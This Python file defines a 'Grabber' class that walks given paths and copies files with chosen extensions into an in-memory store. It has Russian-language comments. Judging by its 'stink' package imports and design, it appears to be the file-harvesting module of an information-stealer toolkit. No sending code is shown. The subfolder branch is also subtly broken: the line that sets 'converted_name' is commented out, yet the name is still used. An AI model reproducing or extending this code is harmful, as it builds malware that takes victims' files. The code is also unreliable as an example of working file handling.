from typing import List
from os import path, walk, listdir, sep

from stink.helpers import MemoryStorage
from stink.helpers.dataclasses import Data
import logging



class Grabber:
    """
    Collects the specified files from the specified paths.
    """
    def __init__(self, paths: List[str], file_types: List[str], check_sub_folders: bool = False):

        self.__paths = paths
        self.__file_types = file_types
        self.__check_sub_folders = check_sub_folders

        self.__storage = MemoryStorage()
        self.__folder = "Grabber"

    def __convert_path_to_filename(self, full_path: str) -> str:
        """
        Converts a full file path to a filename with underscores instead of path separators.

        Example:
        'C:\\Users\\asd\\Desktop\\file.txt' -> 'C_Users_asd_Desktop_file.txt'

        Parameters:
        - full_path (str): The full path of the file.

        Returns:
        - str: The converted filename.
        """
        # Normalize the path to use consistent separators
        normalized_path = path.normpath(full_path)
        # Split the path into parts
        parts = normalized_path.split(path.sep)
        # Join with underscores
        return "_".join(parts)

    def __grab_files(self) -> None:
        """
        Collects the specified files from the specified paths.

        Parameters:
        - None.

        Returns:
        - None.
        """
        for item in self.__paths:

            if path.isfile(item):

                if not any(item.endswith(file_type) for file_type in self.__file_types):
                    continue

                # Выводим полный путь найденного файла
                print(f"Найден файл: {path.abspath(item)}")
                logging.info(f"Найден файл: {path.abspath(item)}")

                # Преобразуем полный путь в имя файла с подчёркиваниями
                converted_name = self.__convert_path_to_filename(path.abspath(item))

                self.__storage.add_from_disk(item, path.join(self.__folder, converted_name))
                self.__storage.add_data("Grabber", converted_name)

            elif path.isdir(item):

                if self.__check_sub_folders:
                    for folder_name, _, filenames in walk(item):
                        for filename in filenames:

                            if not any(filename.endswith(file_type) for file_type in self.__file_types):
                                continue

                            full_path = path.join(folder_name, filename)

                            # Выводим полный путь найденного файла
                            print(f"Найден файл: {path.abspath(full_path)}")
                            logging.info(f"Найден файл: {path.abspath(full_path)}")

                            # Преобразуем полный путь в имя файла с подчёркиваниями
                            #converted_name = self.__convert_path_to_filename(path.abspath(full_path))

                            self.__storage.add_from_disk(full_path, path.join(self.__folder, converted_name))
                            self.__storage.add_data("Grabber", converted_name)
                            #self.__storage.add_from_disk(path.join(item, filename), path.join(self.__folder, filename))
                            #self.__storage.add_data("Grabber", filename)
                else:
                    for filename in listdir(item):

                        if not any(filename.endswith(file_type) for file_type in self.__file_types):
                            continue

                        full_path = path.join(item, filename)

                        # Выводим полный путь найденного файла
                        print(f"Найден файл: {path.abspath(full_path)}")
                        logging.info(f"Найден файл: {path.abspath(full_path)}")

                        # Преобразуем полный путь в имя файла с подчёркиваниями
                        converted_name = self.__convert_path_to_filename(path.abspath(full_path))

                        self.__storage.add_from_disk(full_path, path.join(self.__folder, converted_name))
                        self.__storage.add_data("Grabber", converted_name)

    def run(self) -> Data:
        """
        Launches the grabber module.

        Parameters:
        - None.

        Returns:
        - Data: Collected data.
        """
        try:

            self.__grab_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Grabber]: {repr(e)}")


